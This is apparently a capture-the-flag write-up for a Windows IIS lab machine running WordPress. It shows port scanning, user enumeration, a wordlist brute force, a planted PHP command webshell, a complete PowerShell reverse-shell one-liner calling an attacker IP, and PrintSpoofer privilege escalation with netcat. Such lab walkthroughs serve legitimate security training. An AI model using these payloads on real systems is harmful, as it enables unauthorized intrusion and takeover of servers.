Running our nmap scan we have 2 open ports


```bash
# Nmap 7.94SVN scan initiated Mon Mar 11 06:41:24 2024 as: nmap -p- -T4 -v --min-rate=1000 -sCV -oN nmap.txt 10.10.97.2
Nmap scan report for 10.10.97.2
Host is up (0.15s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: RETROWEB
|   NetBIOS_Domain_Name: RETROWEB
|   NetBIOS_Computer_Name: RETROWEB
|   DNS_Domain_Name: RetroWeb
|   DNS_Computer_Name: RetroWeb
|   Product_Version: 10.0.14393
|_  System_Time: 2024-03-11T05:43:47+00:00
|_ssl-date: 2024-03-11T05:43:51+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=RetroWeb
| Issuer: commonName=RetroWeb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-03-10T05:18:49
| Not valid after:  2024-09-09T05:18:49
| MD5:   8d7a:1577:c616:ae1a:6364:e666:f0ba:53d0
|_SHA-1: d697:44ba:89ed:4056:f469:9352:05df:7214:d874:ea37
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Mar 11 06:43:52 2024 -- 1 IP address (1 host up) scanned in 147.74 seconds
```



Navigating to port 80 we have a default windows IIS page 


![](https://i.imgur.com/ZrcU03H.png)


Since we don't have much to enumerate rather than port 80/HTTP, i decided to fuzz for directories and found `/retro`

![](https://i.imgur.com/qZBHJMR.png)



Navigating to `/retro` we found a wordpress website


![](https://i.imgur.com/kLcNXUl.png)

Enumerating this site using `wpscan` there was nothing more interesting than finding a username called **wade**

```bash
❯ wpscan --url http://10.10.97.2/retro/ -e u
```

![](https://i.imgur.com/DLJ3qAN.png)


Since we have a username let bruteforce the login page, we first need to use the `cewl` tool to generate a password wordlist from the site it self so we can use it against the username we got

```bash
❯ cewl -m 5 http://10.10.97.2/retro/ > pass.txt
```

![](https://i.imgur.com/rcu97nj.png)


Then we can bruteforce, as shown below we found a valid credentials for the user `wade`


```bash
❯ wpscan --url http://10.10.97.2/retro/ -U wade -P ./pass.txt --password-attack wp-login
```



![](https://i.imgur.com/WLBIFjJ.png)


```
wade:parzival
```


We can then login via wordpress with the username and password we have gotten

![](https://i.imgur.com/aShbHqz.png)


Now to get a **reverse shell**, navigate to **Plugins --> Plugins Editor**



![](https://i.imgur.com/FOI3vVu.png)

Then overwrite the `absolute-relative-urls.php` file and paste in your own PHP reverse shell as this is the file that will be called when we want to get the reverse shell, then scroll down and click on **Update** to complete this step


![](https://i.imgur.com/EFxEgsc.png)



Now go ahead and start up your listener and navigate to . This should trigger your reverse shell, Note that as shown below i used `rlwrap` for automatic windows shell stabilization


![](https://i.imgur.com/PzgjvSn.png)
![](https://i.imgur.com/XQrqnX6.png)



However as seen above, looks like our shell is been terminated, well this is probably cos' we are using a PHP cmd for the windows host which isn't that stable, we can therefore upload a webshell and use powershell to get a reverse shell, save the below code in the `.php` plugin and navigate to the website again


```php
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
```


However i noticed that the plugin changes, so make sure to confirm the URL path also :P

![](https://i.imgur.com/PWLyX12.png)


Then get a reverse shell using the following powershell command, make sure to change the IP and port to yours irrespectively

```powershell
powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('10.11.69.221', 4444);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"
```


![](https://i.imgur.com/Du9Rrds.png)


Running `whoami /priv` we can see we have the **SeImpersonatePrivilege** enabled, this role determines which programs are allowed to impersonate a user or other specified account and perform actions on behalf of the user. we can go ahead and use this privilege to get a shell as administrator

![](https://i.imgur.com/ih3wy3s.png)


Transfer [nc64.exe](https://github.com/sec-fortress/Exploits/blob/main/nc64.exe) and [PrintSpoofer32.exe](https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer32.exe) to target machine and run the below command also make sure to start your listener before doing this


```bash
# start listener
sudo nc -lvnp 443

# start exploit
.\PrintSpoofer32.exe -c "c:\windows\temp\nc64.exe 10.11.69.221 443 -e cmd"
```



![](https://i.imgur.com/A24bHmY.png)



GG 😄

